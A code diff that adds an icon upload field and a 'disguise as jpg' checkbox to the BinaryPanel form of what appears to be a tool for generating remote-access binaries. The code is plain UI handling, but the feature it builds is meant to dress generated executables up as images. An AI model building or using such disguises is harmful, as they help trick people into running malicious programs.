@@ -57,6 +57,26 @@ export const BinaryPanel = React.memo(function BinaryPanel({ variant, form, setF
         <FieldLabel>{t("generate.panel.filename")}</FieldLabel>
         <Input aria-label={t("generate.panel.output_filename")} name={`${id}-filename`} value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} />
       </div>
+      <div className="rounded-lg border border-border/60 p-3 space-y-3 bg-muted/20">
+        <FieldLabel>{t("generate.panel.icon")}</FieldLabel>
+        <Input type="file" accept=".ico,.png" onChange={(e) => {
+          const file = e.target.files?.[0] || null;
+          if (!file) { setForm({ ...form, icon_file: null, icon_b64: "" }); return; }
+          if (file.size > 256 * 1024) { alert(t("generate.toast.icon_too_large")); return; }
+          const reader = new FileReader();
+          reader.onload = () => {
+            const b64 = (reader.result as string).split(",")[1] || "";
+            setForm((prev) => ({ ...prev, icon_file: file, icon_b64: b64 }));
+          };
+          reader.readAsDataURL(file);
+        }} />
+        {form.icon_b64 && <div className="text-xs text-muted-foreground">{t("generate.panel.icon_selected")}: {form.icon_file?.name} ({Math.round(form.icon_b64.length * 0.75 / 1024)}KB)</div>}
+        <div className="flex items-center gap-x-2">
+          <Checkbox id={`${id}-disguise-jpg`} checked={form.disguise_as === "jpg"} onCheckedChange={(checked) => setForm({ ...form, disguise_as: checked === true ? "jpg" : "" })} />
+          <Label htmlFor={`${id}-disguise-jpg`} className="text-sm text-foreground">{t("generate.panel.disguise_as_jpg")}</Label>
+        </div>
+        {form.disguise_as === "jpg" && <div className="text-xs text-amber-600">{t("generate.panel.disguise_hint")}</div>}
+      </div>
       {cfg.showP2P && (
         <AdvancedSection title={t("generate.panel.p2p_config")}>
           <div>
